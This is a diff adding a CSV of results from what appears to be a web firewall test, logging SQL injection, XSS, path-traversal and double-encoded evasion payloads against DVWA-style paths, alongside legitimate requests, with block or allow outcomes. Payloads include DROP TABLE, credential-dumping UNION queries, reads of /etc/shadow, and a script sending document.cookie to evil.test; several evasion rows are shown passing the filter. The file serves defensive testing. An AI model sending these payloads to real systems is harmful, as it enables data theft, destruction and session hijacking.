@@ -1,0 +1,94 @@
+group,expect,got,status,method,path,query,body,reason,ms
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20OR%20%271%27%3D%271&Submit=Submit,,Both agree: confirmed attack,14.0
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20OR%201%3D1--&Submit=Submit,,Both agree: confirmed attack,7.7
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=%27%20OR%201%3D1%23&Submit=Submit,,Both agree: confirmed attack,4.6
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=admin%27--&Submit=Submit,,Case B – ML catches obfuscated payload [score=0.9546 >= 0.5],4.6
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--&Submit=Submit,,Both agree: confirmed attack,7.0
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20UNION%20SELECT%20NULL%2CNULL--&Submit=Submit,,Both agree: confirmed attack,4.6
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%3B%20DROP%20TABLE%20users--&Submit=Submit,,Both agree: confirmed attack,4.6
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=%27%20OR%20%27a%27%3D%27a&Submit=Submit,,Case B – ML catches obfuscated payload [score=1.0000 >= 0.5],7.5
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20AND%20SLEEP%285%29--&Submit=Submit,,Both agree: confirmed attack,5.2
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20AND%201%3D1--&Submit=Submit,,Both agree: confirmed attack,6.6
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%20OR%201%3D1&Submit=Submit,,Both agree: confirmed attack,8.4
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=%27%3B%20EXEC%20xp_cmdshell%28%27dir%27%29--&Submit=Submit,,Both agree: confirmed attack,8.2
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0--&Submit=Submit,,Both agree: confirmed attack,4.9
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=%22%20OR%20%22%22%3D%22&Submit=Submit,,Case B – ML catches obfuscated payload [score=1.0000 >= 0.5],4.5
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20ORDER%20BY%203--&Submit=Submit,,Case B – ML catches obfuscated payload [score=0.8252 >= 0.5],4.8
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,Both agree: confirmed attack,5.5
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,,Both agree: confirmed attack,5.4
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Csvg%20onload%3Dalert%281%29%3E,,Both agree: confirmed attack,4.7
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cbody%20onload%3Dalert%281%29%3E,,Both agree: confirmed attack,5.2
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=javascript%3Aalert%281%29,,Both agree: confirmed attack,4.4
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E,,Both agree: confirmed attack,4.4
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,,Both agree: confirmed attack,4.7
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.test%2F%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E,,Both agree: confirmed attack,4.4
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Ca%20href%3D%22javascript%3Aalert%281%29%22%3Ex%3C%2Fa%3E,,Both agree: confirmed attack,4.7
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,,Both agree: confirmed attack,4.5
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E,,Both agree: confirmed attack,4.8
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E,,Both agree: confirmed attack,5.1
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=..%2F..%2F..%2Fetc%2Fpasswd,,Both agree: confirmed attack,5.2
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=..%5C..%5C..%5Cwindows%5Cwin.ini,,Both agree: confirmed attack,4.6
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=....%2F%2F....%2F%2Fetc%2Fpasswd,,Both agree: confirmed attack,4.3
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=%2Fetc%2Fpasswd,,"Case A – rule wins [rule=PATH_005, ML=0.0273 < 0.5]",5.2
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=%252e%252e%252f%252e%252e%252fetc%252fpasswd,,Both agree: confirmed attack,4.4
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=..%2F..%2F..%2F..%2Fetc%2Fshadow,,Both agree: confirmed attack,5.0
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=%2Fproc%2Fself%2Fenviron,,"Case A – rule wins [rule=PATH_008, ML=0.1382 < 0.5]",4.6
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php,,"Case A – rule wins [rule=PATH_013, ML=0.4204 < 0.5]",4.7
+obfuscated,block,block,403,GET,/,id=CASE%20WHEN%201%3D1%20THEN%201%20ELSE%200%20END,,Case B – ML catches obfuscated payload [score=0.6801 >= 0.5],4.7
+obfuscated,block,block,403,GET,/,id=1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1--,,Both agree: confirmed attack,5.2
+obfuscated,block,block,403,GET,/,id=1%27%20%2F%2A%2150000UNION%2A%2F%20%2F%2A%2150000SELECT%2A%2F%201%2C2--,,Both agree: confirmed attack,5.2
+obfuscated,block,block,403,GET,/,id=1%20oR%201%3D1,,Both agree: confirmed attack,5.0
+obfuscated,block,block,403,GET,/,id=1%27%20AnD%20%271%27%3D%271,,Both agree: confirmed attack,4.6
+obfuscated,block,block,403,GET,/,id=IF%281%3D1%2CSLEEP%285%29%2C0%29,,Both agree: confirmed attack,4.6
+obfuscated,block,block,403,GET,/,id=%28SELECT%201%20FROM%20%28SELECT%20SLEEP%285%29%29a%29,,Both agree: confirmed attack,4.9
+obfuscated,block,block,403,GET,/,id=1%20AND%20ASCII%28SUBSTRING%28user%28%29%2C1%2C1%29%29%3E64,,Both agree: confirmed attack,4.4
+legit,allow,block,403,GET,/,,,Case B – ML catches obfuscated payload [score=1.0000 >= 0.5],4.7
+legit,allow,allow,200,GET,/login.php,,,,21.1
+legit,allow,allow,302,GET,/index.php,,,,6.7
+legit,allow,allow,200,GET,/about.php,,,,7.2
+legit,allow,allow,200,GET,/instructions.php,,,,8.0
+legit,allow,allow,200,GET,/setup.php,,,,6.8
+legit,allow,block,403,GET,/vulnerabilities/sqli/,id=1&Submit=Submit,,Case B – ML catches obfuscated payload [score=0.9612 >= 0.5],5.0
+legit,allow,allow,302,GET,/vulnerabilities/xss_r/,name=Alice,,,9.0
+legit,allow,allow,302,GET,/vulnerabilities/xss_r/,name=Bob%20Smith,,,11.1
+legit,allow,allow,404,GET,/search,q=red%20shoes%20size%2010,,,7.0
+legit,allow,allow,404,GET,/search,q=blue%20jeans,,,6.2
+legit,allow,allow,404,GET,/search,q=laptop%20bag,,,5.0
+legit,allow,allow,404,GET,/contact,email=john.doe%40example.com,,,5.0
+legit,allow,allow,404,GET,/products,page=2,,,5.2
+legit,allow,block,403,GET,/products,sort=price&order=asc,,Case B – ML catches obfuscated payload [score=0.7589 >= 0.5],4.6
+legit,allow,block,403,GET,/products,category=books&page=3,,Case B – ML catches obfuscated payload [score=0.9634 >= 0.5],4.6
+legit,allow,allow,404,GET,/user,id=42,,,5.8
+legit,allow,allow,404,GET,/user,name=thabo,,,10.8
+legit,allow,allow,404,GET,/search,city=Johannesburg,,,7.9
+legit,allow,allow,404,GET,/help,q=how%20to%20reset%20password,,,4.8
+legit,allow,allow,404,GET,/comment,text=Great%20product%2C%20thanks%21,,,5.3
+legit,allow,block,403,GET,/user,name=Anna-Marie,,Case B – ML catches obfuscated payload [score=0.7869 >= 0.5],4.4
+legit,allow,allow,404,GET,/search,q=cheap%20flights%20to%20Cape%20Town,,,4.8
+legit,allow,block,403,GET,/products,product=shoes&size=10,,Case B – ML catches obfuscated payload [score=0.9327 >= 0.5],5.0
+legit,allow,allow,302,GET,/,lang=en,,,5.7
+legit,allow,allow,404,GET,/verify,token=abc123def456,,,6.3
+legit,allow,allow,302,GET,/,ref=homepage,,,6.3
+legit,allow,block,403,GET,/,utm_source=newsletter&utm_medium=email,,Case B – ML catches obfuscated payload [score=0.9002 >= 0.5],9.6
+legit,allow,block,403,GET,/cart,item=17&qty=2,,Case B – ML catches obfuscated payload [score=0.9949 >= 0.5],7.1
+legit,allow,allow,404,GET,/orders,status=shipped,,,5.0
+legit_hard,allow,block,403,GET,/search,name=O%27Brien,,Case B – ML catches obfuscated payload [score=0.9852 >= 0.5],4.2
+legit_hard,allow,allow,404,GET,/search,q=select%20a%20size,,,4.9
+legit_hard,allow,block,403,GET,/search,comment=I%20want%20to%20update%20my%20order%20or%20delete%20it,,Case B – ML catches obfuscated payload [score=0.8250 >= 0.5],7.4
+legit_hard,allow,block,403,GET,/search,q=where%20is%20the%20nearest%20store%20from%20here,,Case B – ML catches obfuscated payload [score=0.9044 >= 0.5],8.6
+legit_hard,allow,allow,404,GET,/search,title=Tom%20%26%20Jerry,,,5.1
+legit_hard,allow,block,403,GET,/search,q=1%20or%202%20items,,Case B – ML catches obfuscated payload [score=0.5378 >= 0.5],4.4
+legit_hard,allow,block,403,GET,/search,msg=Drop%20me%20a%20line,,Case B – ML catches obfuscated payload [score=0.6008 >= 0.5],4.2
+legit_hard,allow,block,403,GET,/search,q=insert%20coin,,Case B – ML catches obfuscated payload [score=0.5505 >= 0.5],4.3
+legit_hard,allow,block,403,GET,/search,note=use%20the%20union%20room,,Case B – ML catches obfuscated payload [score=0.5881 >= 0.5],4.2
+legit_hard,allow,allow,404,GET,/search,path=docs%2Freadme.txt,,,4.8
+evasion,block,allow,302,GET,/vulnerabilities/sqli/,id=1%2527%2520OR%2520%25271%2527%253D%25271,,,7.1
+evasion,block,block,403,GET,/vulnerabilities/sqli/,id=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E,,Case B – ML catches obfuscated payload [score=0.8707 >= 0.5],8.0
+evasion,block,block,403,GET,/vulnerabilities/sqli/,id=1%2520UNION%2520SELECT%2520user%252Cpassword%2520FROM%2520users--,,Both agree: confirmed attack,8.4
+evasion,block,allow,302,GET,/vulnerabilities/sqli/,id=..%252F..%252F..%252Fetc%252Fpasswd,,,8.7
+evasion,block,block,403,GET,/vulnerabilities/sqli/,id=1%2527%253B%2520DROP%2520TABLE%2520users--,,Both agree: confirmed attack,5.0
+post_form,block,allow,302,POST,/vulnerabilities/sqli/,,id=1%27%20OR%20%271%27%3D%271,,6.4
+post_form,block,block,403,POST,/vulnerabilities/sqli/,,name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,Case B – ML catches obfuscated payload [score=0.8589 >= 0.5],4.9
+post_form,block,block,403,POST,/vulnerabilities/sqli/,,id=1%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--,Both agree: confirmed attack,5.1
+post_form,block,block,403,POST,/vulnerabilities/sqli/,,user=admin%27--,Both agree: confirmed attack,4.5
+post_form,block,block,403,POST,/vulnerabilities/sqli/,,id=1%3B%20DROP%20TABLE%20users--,Both agree: confirmed attack,4.9
